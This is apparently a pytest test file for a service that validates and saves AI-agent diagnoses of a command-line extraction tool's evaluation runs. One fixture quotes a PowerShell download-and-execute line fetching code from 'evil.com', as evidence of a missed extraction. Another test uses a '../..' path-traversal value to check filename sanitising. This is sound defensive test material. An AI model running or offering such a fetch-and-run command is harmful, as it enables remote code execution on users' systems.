"""Tests for EvalDiagnosisService.

Diagnosis is authored by an MCP client agent, not by a server-side LLM call.
These tests cover the three things the service still owns: building the context
packet, validating the agent's diagnosis, and persisting it.
"""

import json
from pathlib import Path

import pytest

from src.services.eval_diagnosis_service import (
    AGENT_TO_CONTRACT,
    CONTRACTS_DIR,
    DIAGNOSIS_CONTEXT_SCHEMA_VERSION,
    DIAGNOSIS_SCHEMA_VERSION,
    DIAGNOSIS_SOURCE_MCP_AGENT,
    DiagnosisValidationError,
    EvalDiagnosisService,
    build_diagnosis_context,
    compute_diagnosis_evidence_sha256,
    load_contract_file,
    normalize_diagnosis,
)

pytestmark = pytest.mark.unit


def _sample_diagnosis() -> dict:
    """Return a valid agent-authored diagnosis payload."""
    return {
        "summary": "Extractor missed 3 commands because the prompt does not cover PowerShell aliases.",
        "failure_category": "prompt_gap",
        "confidence": 0.82,
        "run_signals": {
            "truncation_detected": False,
            "context_pressure": "low",
            "contract_compliance": "partial",
            "finish_reason": "stop",
            "token_utilization_pct": 41,
        },
        "root_causes": [
            {
                "cause": "PowerShell aliases (iwr, iex) not covered by extraction rules",
                "evidence": "Article contains 'iwr http://evil.com | iex' but output omits it",
                "severity": "high",
            }
        ],
        "recommendations": [
            {
                "type": "prompt_edit",
                "action": "Add PowerShell alias expansion note to SCOPE section",
                "rationale": "Common in-the-wild pattern not currently addressed",
                "priority": 1,
            }
        ],
        "contract_violations": ["SCOPE: Extract all single-line Windows commands with arguments"],
    }


def _sample_bundle() -> dict:
    """Return a minimal eval bundle dict for testing."""
    return {
        "schema_version": "eval_bundle_v1",
        "bundle_id": "test-uuid-1234",
        "collected_at": "2026-05-01T00:00:00Z",
        "workflow": {
            "execution_id": 42,
            "article_id": 7,
            "agent_name": "CmdlineExtract",
            "expected_count": 7,
            "actual_count": 4,
            "evaluation_score": -3,
        },
        "llm_request": {"messages": [{"role": "user", "content": "test"}]},
        "llm_response": {"text_output": '{"cmdline_items": [], "count": 4}'},
        "inputs": [{"name": "article_text", "text": "Test article content"}],
        "extraction_context": {"parsed_result": {"items": [], "count": 4}},
        "execution_context": {"status": "completed", "infra_failed": False},
        "integrity": {"bundle_sha256": "abc123", "warnings": []},
    }


class TestLoadContract:
    """Test contract file loading."""

    def test_all_agent_contracts_exist(self):
        """Every agent in AGENT_TO_CONTRACT must map to an existing file."""
        for agent_name, filename in AGENT_TO_CONTRACT.items():
            filepath = CONTRACTS_DIR / filename
            assert filepath.exists(), f"Missing contract for {agent_name}: {filepath}"

    def test_standard_contract_exists(self):
        """The extractor-standard.md foundation contract must exist."""
        filepath = CONTRACTS_DIR / "extractor-standard.md"
        assert filepath.exists()

    def test_load_contract_returns_content(self):
        """Loading a valid contract returns non-empty string."""
        text = load_contract_file("extractor-standard.md")
        assert len(text) > 100
        assert "Extractor" in text

    def test_load_missing_contract_returns_placeholder(self):
        """Loading a non-existent contract returns a placeholder, not an exception."""
        text = load_contract_file("does-not-exist.md")
        assert "not found" in text


class TestBuildDiagnosisContext:
    """The context packet must carry everything the agent needs to reason."""

    def test_context_includes_both_contracts(self):
        context = build_diagnosis_context(_sample_bundle(), "CmdlineExtract")
        assert context["schema_version"] == DIAGNOSIS_CONTEXT_SCHEMA_VERSION
        assert "Extractor" in context["contracts"]["extractor_standard"]
        assert context["contracts"]["agent_contract_file"] == "cmdline-extract.md"
        assert len(context["contracts"]["agent_contract"]) > 100

    def test_context_includes_instructions_and_schema(self):
        context = build_diagnosis_context(_sample_bundle(), "CmdlineExtract")
        assert "failure_category" in context["instructions"]
        assert "run_signals" in context["instructions"]
        assert "untrusted evidence" in context["instructions"]
        assert "explicit confirmation" in context["next_step"]
        assert "save_eval_diagnosis" in context["next_step"]

    def test_context_includes_bundle_and_scoring(self):
        context = build_diagnosis_context(_sample_bundle(), "CmdlineExtract")
        assert context["bundle"]["bundle_id"] == "test-uuid-1234"
        assert context["execution_id"] == 42
        assert context["article_id"] == 7
        assert context["score_context"]["expected_count"] == 7
        assert context["score_context"]["actual_count"] == 4
        assert context["score_context"]["delta"] == -3
        assert context["evidence_sha256"] == compute_diagnosis_evidence_sha256(_sample_bundle(), "CmdlineExtract")

    def test_evidence_digest_ignores_collection_identity_but_detects_evidence_changes(self):
        first = _sample_bundle()
        second = _sample_bundle()
        second["bundle_id"] = "different-collection"
        second["collected_at"] = "2026-05-02T00:00:00Z"
        second["integrity"]["bundle_sha256"] = "different-full-bundle-hash"

        assert compute_diagnosis_evidence_sha256(first, "CmdlineExtract") == compute_diagnosis_evidence_sha256(
            second, "CmdlineExtract"
        )

        second["llm_response"]["text_output"] = '{"cmdline_items": ["different"]}'
        assert compute_diagnosis_evidence_sha256(first, "CmdlineExtract") != compute_diagnosis_evidence_sha256(
            second, "CmdlineExtract"
        )

    def test_evidence_digest_includes_contracts_and_integrity_warnings(self, monkeypatch):
        bundle = _sample_bundle()
        contract_revision = {"value": "contract-v1"}

        def fake_contract(filename):
            return f"{filename}:{contract_revision['value']}"

        monkeypatch.setattr("src.services.eval_diagnosis_service.load_contract_file", fake_contract)
        first = compute_diagnosis_evidence_sha256(bundle, "CmdlineExtract")

        contract_revision["value"] = "contract-v2"
        second = compute_diagnosis_evidence_sha256(bundle, "CmdlineExtract")
        assert first != second

        contract_revision["value"] = "contract-v1"
        bundle["integrity"]["warnings"] = ["PROMPT_TEXT_MISSING"]
        third = compute_diagnosis_evidence_sha256(bundle, "CmdlineExtract")
        assert first != third

    def test_unknown_agent_is_rejected(self):
        with pytest.raises(DiagnosisValidationError, match="Unsupported diagnosis agent"):
            build_diagnosis_context(_sample_bundle(), "NotARealAgent")

    def test_context_is_json_serializable(self):
        context = build_diagnosis_context(_sample_bundle(), "CmdlineExtract")
        assert json.loads(json.dumps(context, default=str))["agent_name"] == "CmdlineExtract"


class TestNormalizeDiagnosis:
    """Agent-supplied diagnoses are validated before they can be persisted."""

    def test_valid_diagnosis_is_stamped_with_metadata(self):
        result = normalize_diagnosis(
            _sample_diagnosis(),
            agent_name="CmdlineExtract",
            execution_id=42,
            bundle=_sample_bundle(),
            authored_by="claude-opus-5",
        )
        assert result["schema_version"] == DIAGNOSIS_SCHEMA_VERSION
        assert result["source"] == DIAGNOSIS_SOURCE_MCP_AGENT
        assert result["authored_by"] == "claude-opus-5"
        assert result["execution_id"] == 42
        assert result["agent_name"] == "CmdlineExtract"
        assert result["diagnosis_id"]
        assert result["created_at"]

    def test_score_context_is_taken_from_bundle(self):
        result = normalize_diagnosis(
            _sample_diagnosis(),
            agent_name="CmdlineExtract",
            execution_id=42,
            bundle=_sample_bundle(),
        )
        assert result["score_context"]["expected_count"] == 7
        assert result["score_context"]["delta"] == -3

    def test_missing_run_signals_are_rejected(self):
        payload = _sample_diagnosis()
        del payload["run_signals"]
        with pytest.raises(DiagnosisValidationError, match="missing required fields"):
            normalize_diagnosis(payload, agent_name="CmdlineExtract", execution_id=42)

    def test_missing_summary_is_rejected(self):
        payload = _sample_diagnosis()
        payload["summary"] = "  "
        with pytest.raises(DiagnosisValidationError, match="summary"):
            normalize_diagnosis(payload, agent_name="CmdlineExtract", execution_id=42)

    def test_unknown_failure_category_is_rejected(self):
        payload = _sample_diagnosis()
        payload["failure_category"] = "vibes"
        with pytest.raises(DiagnosisValidationError, match="failure_category"):
            normalize_diagnosis(payload, agent_name="CmdlineExtract", execution_id=42)

    def test_out_of_range_confidence_is_rejected(self):
        payload = _sample_diagnosis()
        payload["confidence"] = 1.4
        with pytest.raises(DiagnosisValidationError, match="confidence"):
            normalize_diagnosis(payload, agent_name="CmdlineExtract", execution_id=42)

    def test_unknown_recommendation_type_is_rejected(self):
        payload = _sample_diagnosis()
        payload["recommendations"][0]["type"] = "just_try_harder"
        with pytest.raises(DiagnosisValidationError, match="recommendations\\[0\\].type"):
            normalize_diagnosis(payload, agent_name="CmdlineExtract", execution_id=42)

    def test_unknown_severity_is_rejected(self):
        payload = _sample_diagnosis()
        payload["root_causes"][0]["severity"] = "catastrophic"
        with pytest.raises(DiagnosisValidationError, match="severity"):
            normalize_diagnosis(payload, agent_name="CmdlineExtract", execution_id=42)

    def test_root_cause_without_cause_is_rejected(self):
        payload = _sample_diagnosis()
        payload["root_causes"][0]["cause"] = ""
        with pytest.raises(DiagnosisValidationError, match="cause"):
            normalize_diagnosis(payload, agent_name="CmdlineExtract", execution_id=42)

    def test_root_cause_without_evidence_is_rejected(self):
        payload = _sample_diagnosis()
        payload["root_causes"][0]["evidence"] = "  "
        with pytest.raises(DiagnosisValidationError, match="evidence"):
            normalize_diagnosis(payload, agent_name="CmdlineExtract", execution_id=42)

    def test_recommendation_without_rationale_is_rejected(self):
        payload = _sample_diagnosis()
        payload["recommendations"][0]["rationale"] = "  "
        with pytest.raises(DiagnosisValidationError, match="rationale"):
            normalize_diagnosis(payload, agent_name="CmdlineExtract", execution_id=42)

    def test_empty_contract_violation_is_rejected(self):
        payload = _sample_diagnosis()
        payload["contract_violations"] = ["  "]
        with pytest.raises(DiagnosisValidationError, match="contract_violations"):
            normalize_diagnosis(payload, agent_name="CmdlineExtract", execution_id=42)

    @pytest.mark.parametrize("field", ["root_causes", "recommendations"])
    def test_failure_requires_explanation_and_action(self, field):
        payload = _sample_diagnosis()
        payload[field] = []
        with pytest.raises(DiagnosisValidationError, match=field):
            normalize_diagnosis(payload, agent_name="CmdlineExtract", execution_id=42)

    @pytest.mark.parametrize("value", ["false", "true", 0, 1])
    def test_truncation_detected_requires_a_boolean(self, value):
        payload = _sample_diagnosis()
        payload["run_signals"]["truncation_detected"] = value
        with pytest.raises(DiagnosisValidationError, match="truncation_detected"):
            normalize_diagnosis(payload, agent_name="CmdlineExtract", execution_id=42)

    @pytest.mark.parametrize("value", [-1, 101, 40.5, float("inf"), True])
    def test_token_utilization_must_be_a_finite_percentage(self, value):
        payload = _sample_diagnosis()
        payload["run_signals"]["token_utilization_pct"] = value
        with pytest.raises(DiagnosisValidationError, match="token_utilization_pct"):
            normalize_diagnosis(payload, agent_name="CmdlineExtract", execution_id=42)

    @pytest.mark.parametrize("value", [0, -1])
    def test_recommendation_priority_must_be_positive(self, value):
        payload = _sample_diagnosis()
        payload["recommendations"][0]["priority"] = value
        with pytest.raises(DiagnosisValidationError, match="priority"):
            normalize_diagnosis(payload, agent_name="CmdlineExtract", execution_id=42)

    @pytest.mark.parametrize("value", [True, "0.8", float("nan")])
    def test_confidence_requires_a_finite_number(self, value):
        payload = _sample_diagnosis()
        payload["confidence"] = value
        with pytest.raises(DiagnosisValidationError, match="confidence"):
            normalize_diagnosis(payload, agent_name="CmdlineExtract", execution_id=42)

    @pytest.mark.parametrize("value", [1.5, "1", True])
    def test_recommendation_priority_requires_an_integer(self, value):
        payload = _sample_diagnosis()
        payload["recommendations"][0]["priority"] = value
        with pytest.raises(DiagnosisValidationError, match="priority"):
            normalize_diagnosis(payload, agent_name="CmdlineExtract", execution_id=42)

    @pytest.mark.parametrize(
        "field,value",
        [
            ("summary", 3),
            ("failure_category", False),
            ("contract_violations", ["valid", 7]),
        ],
    )
    def test_string_fields_reject_non_strings(self, field, value):
        payload = _sample_diagnosis()
        payload[field] = value
        with pytest.raises(DiagnosisValidationError):
            normalize_diagnosis(payload, agent_name="CmdlineExtract", execution_id=42)

    def test_unknown_top_level_field_is_rejected(self):
        payload = _sample_diagnosis()
        payload["surprise"] = "ignored before strict validation"
        with pytest.raises(DiagnosisValidationError, match="unknown fields"):
            normalize_diagnosis(payload, agent_name="CmdlineExtract", execution_id=42)

    def test_non_object_diagnosis_is_rejected(self):
        with pytest.raises(DiagnosisValidationError, match="JSON object"):
            normalize_diagnosis(["not", "an", "object"], agent_name="CmdlineExtract", execution_id=42)

    def test_correct_behavior_with_no_causes_is_valid(self):
        payload = {
            "summary": "Extraction was correct; the fixture expected_count is stale.",
            "failure_category": "correct_behavior",
            "confidence": 0.9,
            "run_signals": {
                "truncation_detected": False,
                "context_pressure": "unknown",
                "contract_compliance": "full",
                "finish_reason": "unknown",
                "token_utilization_pct": None,
            },
            "root_causes": [],
            "recommendations": [],
            "contract_violations": [],
        }
        result = normalize_diagnosis(payload, agent_name="CmdlineExtract", execution_id=42)
        assert result["failure_category"] == "correct_behavior"
        assert result["root_causes"] == []
        assert result["contract_violations"] == []


class TestSaveDiagnosis:
    """Test diagnosis persistence."""

    def test_saves_json_file(self, tmp_path, monkeypatch):
        import src.services.eval_diagnosis_service as service_module

        monkeypatch.setattr(service_module, "DIAGNOSES_DIR", tmp_path / "diagnoses")
        service = EvalDiagnosisService()
        diagnosis = service.normalize(
            _sample_diagnosis(),
            agent_name="CmdlineExtract",
            execution_id=42,
            bundle=_sample_bundle(),
        )

        path = service.save_diagnosis(diagnosis)

        assert path.exists()
        assert path.name.startswith("42_CmdlineExtract_")
        saved = json.loads(path.read_text(encoding="utf-8"))
        assert saved["failure_category"] == "prompt_gap"
        assert saved["source"] == DIAGNOSIS_SOURCE_MCP_AGENT

    def test_sanitizes_agent_name_in_filename(self, tmp_path, monkeypatch):
        import src.services.eval_diagnosis_service as service_module

        diagnoses_dir = tmp_path / "diagnoses"
        monkeypatch.setattr(service_module, "DIAGNOSES_DIR", diagnoses_dir)
        service = EvalDiagnosisService()
        diagnosis = service.normalize(
            _sample_diagnosis(),
            agent_name="CmdlineExtract",
            execution_id=42,
            bundle=_sample_bundle(),
        )
        diagnosis["agent_name"] = "../../CmdlineExtract"

        path = service.save_diagnosis(diagnosis)

        assert path.parent == diagnoses_dir
        assert ".." not in path.name

    def test_prepare_keeps_diagnosis_hidden_until_publish(self, tmp_path, monkeypatch):
        import src.services.eval_diagnosis_service as service_module

        diagnoses_dir = tmp_path / "diagnoses"
        monkeypatch.setattr(service_module, "DIAGNOSES_DIR", diagnoses_dir)
        service = EvalDiagnosisService()
        diagnosis = service.normalize(
            _sample_diagnosis(),
            agent_name="CmdlineExtract",
            execution_id=42,
            bundle=_sample_bundle(),
        )

        pending_path, final_path = service.prepare_diagnosis_file(diagnosis)

        assert pending_path.exists()
        assert pending_path.suffix == ".pending"
        assert not final_path.exists()
        assert list(diagnoses_dir.glob("*.json")) == []

        published_path = service.publish_diagnosis_file(pending_path, final_path)

        assert published_path == final_path
        assert final_path.exists()
        assert not pending_path.exists()


class TestNoServerSideLlmPath:
    """Diagnosis must never call a provider from the server."""

    def test_service_module_has_no_llm_dependencies(self):
        import src.services.eval_diagnosis_service as service_module

        text = Path(service_module.__file__).read_text(encoding="utf-8")
        assert "LLMService" not in text
        assert "request_chat" not in text
        assert "DIAGNOSIS_PROVIDER" not in text

    def test_service_constructs_without_an_llm_service(self):
        service = EvalDiagnosisService()
        assert not hasattr(service, "llm_service")
        assert not hasattr(service, "diagnose_bundle")
